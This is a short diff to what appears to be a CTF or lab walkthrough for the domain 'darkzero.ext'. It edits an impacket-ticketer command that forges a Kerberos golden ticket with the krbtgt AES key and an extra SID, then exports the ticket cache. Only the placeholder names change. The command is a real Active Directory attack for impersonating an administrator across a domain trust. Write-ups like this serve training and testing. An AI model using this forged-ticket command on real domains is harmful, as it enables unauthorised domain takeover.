@@ -556,8 +556,8 @@ Result ends in `-1603`. ⚠ save the **whole** SID — it's your `-extra-sid` va
 ```bash
 impacket-ticketer -aesKey <KRBTGT_AES256> \
   -domain darkzero.ext \
-  -domain-sid <SOURCE_DOMAIN_SID> \
-  -extra-sid <TARGET_SID>-1603 \
+  -domain-sid <DOMAIN_SID> \
+  -extra-sid <CROSSING_SID> \
   administrator
 
 export KRB5CCNAME=$(pwd)/administrator.ccache
